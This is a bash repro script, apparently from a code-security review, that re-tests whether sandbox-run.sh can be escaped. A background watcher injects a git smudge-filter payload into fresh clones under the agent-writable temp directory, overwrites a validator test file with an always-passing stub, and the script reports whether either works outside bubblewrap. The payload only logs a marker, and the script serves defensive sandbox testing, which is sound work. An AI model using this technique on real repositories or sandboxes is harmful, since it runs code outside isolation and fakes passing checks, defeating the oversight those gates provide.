#!/usr/bin/env bash
# F-DG0-141 re-verification (code-security-reviewer, DG0 round 14). Disposable clones only.
# Runs the round-13 race (a concurrent watcher plants a git smudge filter into any fresh clone it can find under
# /tmp/claude-0, the agent-writable $TMPDIR) against sandbox-run.sh at a given commit.
# The watcher is broadened: it scans every .git/config under $TMPDIR (not just sbxrun.*), and also tries to swap a
# test file in any clone it sees, so the "trace-free" variant is covered as well.
#   usage: repro-r14-f141-race.sh <commit> [<src-repo>]
set -uo pipefail
COMMIT="$1"; SRC="${2:-/home/user/My-owns}"
W="$(mktemp -d "${TMPDIR:-/tmp}/r14-race.XXXX")"; R="$W/orch-repo"
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
git clone -q "$SRC" "$R" && git -C "$R" checkout -q "$COMMIT"
echo "commit $(git -C "$R" rev-parse HEAD); sandbox-run.sh sha256 $(sha256sum "$R/tools/gates/sandbox-run.sh" | cut -c1-16)"
PWN="$W/PWNED.txt"; SWP="$W/SWAPPED.txt"
cat > "$W/payload.sh" <<PAY
#!/bin/sh
echo "smudge ran OUTSIDE bwrap: pid=\$\$ cwd=\$(pwd)" >> "$PWN"
cat
PAY
chmod +x "$W/payload.sh"
( end=$((SECONDS+60)); while [ $SECONDS -lt $end ]; do
    for g in $(find /tmp/claude-0 -maxdepth 4 -type d -name .git -newer "$W/payload.sh" 2>/dev/null | grep -v "^$W/"); do
      [ -f "$g/config" ] || continue
      grep -q '^\[filter "x"\]' "$g/config" 2>/dev/null || { printf '[filter "x"]\n\tsmudge = %s\n\tclean = cat\n' "$W/payload.sh" >> "$g/config"; mkdir -p "$g/info"; echo '* filter=x' > "$g/info/attributes"; echo "watcher: planted into $g" >&2; }
      t="$(dirname "$g")/tools/gates/tests/validator.test.mjs"
      [ -f "$t" ] && ! grep -q SWAPPED "$t" && { printf 'import test from "node:test"; test("SWAPPED", () => {});\n' > "$t" 2>/dev/null && echo "swapped $t" >> "$SWP"; }
    done
  done ) &
WATCH=$!
sleep 0.3
"$R/tools/gates/sandbox-run.sh" HEAD -- bash -c 'sleep 3; grep -c SWAPPED tools/gates/tests/validator.test.mjs || true; git status --porcelain | head -3; echo "inside: pwd=$(pwd)"'
echo "sandbox-run exit: $?"
kill $WATCH 2>/dev/null; wait $WATCH 2>/dev/null
echo "== result:"
if [ -s "$PWN" ]; then echo "ESCAPE: $(wc -l < "$PWN") smudge execution(s) outside bubblewrap"; head -2 "$PWN"; else echo "no smudge execution outside bubblewrap"; fi
if [ -s "$SWP" ]; then echo "SWAP: the clone was modified from outside: $(head -1 "$SWP")"; else echo "no clone visible/modifiable from outside"; fi
rm -rf "$W"
